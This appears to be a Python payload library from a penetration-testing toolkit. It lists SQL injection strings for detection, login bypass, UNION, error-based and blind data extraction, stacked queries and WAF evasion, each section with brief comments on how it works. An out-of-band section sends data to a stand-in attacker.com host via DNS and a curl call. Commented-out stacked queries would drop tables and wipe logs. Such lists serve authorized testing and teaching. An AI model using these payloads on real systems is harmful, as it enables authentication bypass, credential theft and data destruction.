#!/usr/bin/env python3
"""
SQL Injection Payloads
======================

Payloads for detecting and exploiting SQL injection vulnerabilities.

How SQL Injection Works:
------------------------
SQL injection occurs when user input is concatenated directly into SQL queries
without proper sanitization or parameterization.

Example vulnerable code:
    query = f"SELECT * FROM users WHERE username = '{username}'"

If username = "admin' OR '1'='1", the query becomes:
    SELECT * FROM users WHERE username = 'admin' OR '1'='1'
    
This returns all users because '1'='1' is always true.

Detection Strategy:
1. Submit payloads that break SQL syntax (quotes, comments)
2. Look for database error messages in responses
3. Compare response lengths/times for boolean-based detection
4. Use time delays for blind injection confirmation
"""

# ============================================================
# DETECTION PAYLOADS
# ============================================================
# Use these first to detect if a parameter is vulnerable

DETECTION = [
    # Basic quotes - break string context
    "'",                    # Single quote - most common
    "''",                   # Double single quote
    '"',                    # Double quote
    "\\",                   # Backslash escape
    
    # Arithmetic tests - if evaluated, math happens
    "1+1",                  # Should show 2 if evaluated
    "1*5",                  # Should show 5 if evaluated
    
    # Comment tests - truncate query
    "--",                   # SQL comment (MySQL, MSSQL, PostgreSQL)
    "#",                    # MySQL comment
    "/*",                   # Block comment start
    
    # Boolean tests - compare true vs false response
    "' AND '1'='1",         # True condition
    "' AND '1'='2",         # False condition (compare response diff)
    "1 AND 1=1",            # Numeric true
    "1 AND 1=2",            # Numeric false
]

# Error patterns to look for in responses
ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySqlException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"ORA-\d{5}",
    r"Oracle.*Driver",
    r"Microsoft.*ODBC.*SQL Server",
    r"SQLServer JDBC Driver",
    r"SQLSTATE\[",
    r"SQLite.*error",
    r"sqlite3\.OperationalError",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"System\.Data\.SqlClient",
    r"Syntax error.*in query expression",
]


# ============================================================
# AUTHENTICATION BYPASS
# ============================================================
# Use on login forms to bypass authentication

AUTH_BYPASS = [
    # Classic OR-based bypass
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "' OR 1=1#",
    
    # Admin user targeting
    "admin'--",
    "admin'#",
    "admin'/*",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin')--",
    
    # Closing parentheses (for prepared statements)
    "') OR ('1'='1",
    "') OR '1'='1'--",
    "')) OR (('1'='1",
    
    # Double quote variants
    '" OR "1"="1',
    '" OR "1"="1"--',
    
    # Null byte injection
    "admin'%00",
    
    # Combined techniques
    "' OR 'x'='x",
    "' OR ''='",
    "1' OR '1'='1' LIMIT 1--",
    "' UNION SELECT 1,'admin','password'--",
]

# How these work:
# The goal is to make the WHERE clause always true, or comment out
# the password check entirely.
#
# Original: SELECT * FROM users WHERE user='INPUT' AND pass='PASS'
# Injected: SELECT * FROM users WHERE user='admin'--' AND pass='PASS'
#                                                   ^^ commented out!


# ============================================================
# UNION-BASED EXTRACTION
# ============================================================
# Extract data from other tables by appending UNION SELECT

UNION = [
    # Determine number of columns (add NULLs until no error)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    
    # Once columns known, extract data
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password,3 FROM users--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
    
    # Get database version
    "' UNION SELECT @@version,2,3--",           # MySQL/MSSQL
    "' UNION SELECT version(),2,3--",           # PostgreSQL
    "' UNION SELECT sqlite_version(),2,3--",    # SQLite
    
    # Get current user
    "' UNION SELECT user(),2,3--",
    "' UNION SELECT current_user,2,3--",
]

# How UNION works:
# UNION combines results from two queries. Both must have same columns.
# 
# Original: SELECT name,price FROM products WHERE id=1
# Injected: SELECT name,price FROM products WHERE id=1 UNION SELECT user,pass FROM users
#
# Result includes both product data AND user credentials


# ============================================================
# ERROR-BASED EXTRACTION
# ============================================================
# Force errors that leak data in error messages

ERROR_BASED = [
    # MySQL
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    
    # PostgreSQL  
    "' AND 1=CAST((SELECT version()) AS int)--",
    
    # MSSQL
    "' AND 1=CONVERT(int,(SELECT @@version))--",
]

# How it works:
# These payloads cause type conversion errors or other errors
# that include the extracted data in the error message itself.


# ============================================================
# BLIND BOOLEAN-BASED
# ============================================================
# When no visible output - infer data from true/false responses

BLIND_BOOLEAN = [
    # Basic true/false
    "' AND 1=1--",          # True - normal response
    "' AND 1=2--",          # False - different response
    
    # Extract data character by character
    "' AND SUBSTRING(username,1,1)='a'--",
    "' AND SUBSTRING(username,1,1)='b'--",
    "' AND ASCII(SUBSTRING(username,1,1))>97--",
    
    # Check if table exists
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND (SELECT COUNT(*) FROM admin)>0--",
    
    # Check column exists
    "' AND (SELECT COUNT(password) FROM users)>0--",
]

# How it works:
# Compare response when condition is true vs false.
# Different page content/length indicates injectable.
# Extract data by asking yes/no questions about each character.


# ============================================================
# BLIND TIME-BASED
# ============================================================
# When boolean-based doesn't work - use time delays

BLIND_TIME = [
    # MySQL
    "' AND SLEEP(5)--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "1' AND (SELECT SLEEP(5))--",
    "'; SELECT SLEEP(5);--",
    
    # PostgreSQL
    "'; SELECT pg_sleep(5);--",
    "' AND pg_sleep(5)--",
    
    # MSSQL
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=1; WAITFOR DELAY '0:0:5'--",
    
    # SQLite
    "' AND 1=randomblob(500000000)--",  # CPU delay
    
    # Oracle
    "' AND DBMS_LOCK.SLEEP(5)--",
]

# How it works:
# If vulnerable, the response will be delayed by 5 seconds.
# Extract data by adding conditions:
#   IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)
# 5 second delay = first char is 'a'


# ============================================================
# STACKED QUERIES
# ============================================================
# Execute multiple statements (when supported)

STACKED = [
    # Data extraction
    "'; SELECT * FROM users;--",
    
    # Data modification (DANGEROUS - use only on test systems!)
    # "'; UPDATE users SET password='hacked' WHERE username='admin';--",
    # "'; INSERT INTO users VALUES('hacker','hacked');--",
    # "'; DELETE FROM logs;--",
    # "'; DROP TABLE users;--",
    
    # Database enumeration
    "'; SELECT table_name FROM information_schema.tables;--",
]

# How it works:
# Some databases (MSSQL, PostgreSQL) allow multiple queries separated by ;
# This enables executing entirely new queries beyond just manipulating WHERE clause


# ============================================================
# OUT-OF-BAND (OOB)
# ============================================================
# Exfiltrate data via DNS/HTTP when no direct output

OUT_OF_BAND = [
    # MySQL - DNS exfiltration
    "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--",
    
    # MySQL - write to file
    "' INTO OUTFILE '/tmp/test.txt'--",
    "' INTO DUMPFILE '/tmp/test.txt'--",
    
    # MSSQL - DNS exfiltration
    "'; EXEC master..xp_dirtree '\\\\attacker.com\\a';--",
    
    # PostgreSQL - DNS
    "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v='||version();--",
]

# How it works:
# Data is sent to attacker-controlled server via DNS lookup or HTTP request.
# Attacker monitors their server logs to see exfiltrated data.


# ============================================================
# WAF BYPASS TECHNIQUES
# ============================================================
# Evade Web Application Firewalls

WAF_BYPASS = [
    # Case variation
    "' oR '1'='1",
    "' Or '1'='1",
    "' uNiOn SeLeCt 1,2,3--",
    
    # Comment insertion
    "' UN/**/ION SEL/**/ECT 1,2,3--",
    "' UNI%0bON SEL%0bECT 1,2,3--",
    
    # URL encoding
    "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
    "%27%20UNION%20SELECT%201,2,3--",
    
    # Double URL encoding
    "%2527%2520OR%2520%25271%2527%253D%25271",
    
    # Unicode
    "' OR '1'＝'1",  # Fullwidth equals
    
    # Whitespace alternatives
    "'+OR+'1'='1",
    "'%09OR%09'1'='1",  # Tab
    "'%0aOR%0a'1'='1",  # Newline
    "'%0dOR%0d'1'='1",  # Carriage return
    
    # No spaces
    "'OR'1'='1'",
    "'OR(1=1)#",
    
    # Scientific notation
    "0e0UNION SELECT 1,2,3",
    
    # Parentheses
    "' OR (1)=(1)--",
    
    # Alternative keywords
    "' || '1'='1",      # OR alternative
    "' && '1'='1",      # AND alternative
]


# ============================================================
# DATABASE-SPECIFIC PAYLOADS
# ============================================================

MYSQL = [
    "' AND 1=1#",
    "' UNION SELECT @@version,2,3#",
    "' UNION SELECT user(),database(),3#",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()#",
]

POSTGRESQL = [
    "' AND 1=1--",
    "' UNION SELECT version(),2,3--",
    "' UNION SELECT current_user,current_database(),3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='public'--",
]

MSSQL = [
    "' AND 1=1--",
    "' UNION SELECT @@version,2,3--",
    "' UNION SELECT user_name(),db_name(),3--",
    "' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'--",
]

ORACLE = [
    "' AND 1=1--",
    "' UNION SELECT banner,2,3 FROM v$version WHERE ROWNUM=1--",
    "' UNION SELECT user,2,3 FROM dual--",
    "' UNION SELECT table_name,2,3 FROM all_tables--",
]

SQLITE = [
    "' AND 1=1--",
    "' UNION SELECT sqlite_version(),2,3--",
    "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--",
]


# ============================================================
# ALL PAYLOADS COMBINED
# ============================================================

ALL = (
    DETECTION + 
    AUTH_BYPASS + 
    UNION[:5] +  # Just column detection
    BLIND_BOOLEAN[:4] +
    BLIND_TIME[:4] +
    WAF_BYPASS[:10]
)


# ============================================================
# USAGE EXAMPLE
# ============================================================

if __name__ == "__main__":
    print("""
SQL Injection Payload Library
=============================

Categories:
  - DETECTION ({} payloads) - Initial vulnerability testing
  - AUTH_BYPASS ({} payloads) - Login form bypass  
  - UNION ({} payloads) - Data extraction via UNION
  - ERROR_BASED ({} payloads) - Extract data via errors
  - BLIND_BOOLEAN ({} payloads) - Infer data from response changes
  - BLIND_TIME ({} payloads) - Infer data from time delays
  - STACKED ({} payloads) - Multiple query execution
  - OUT_OF_BAND ({} payloads) - Exfiltrate via DNS/HTTP
  - WAF_BYPASS ({} payloads) - Evade firewalls

Database-specific:
  - MYSQL ({} payloads)
  - POSTGRESQL ({} payloads)
  - MSSQL ({} payloads)
  - ORACLE ({} payloads)
  - SQLITE ({} payloads)

Usage:
  from payloads.sqli import AUTH_BYPASS, DETECTION
  
  for payload in DETECTION:
      test_param(url, param, payload)
""".format(
        len(DETECTION), len(AUTH_BYPASS), len(UNION),
        len(ERROR_BASED), len(BLIND_BOOLEAN), len(BLIND_TIME),
        len(STACKED), len(OUT_OF_BAND), len(WAF_BYPASS),
        len(MYSQL), len(POSTGRESQL), len(MSSQL), len(ORACLE), len(SQLITE)
    ))
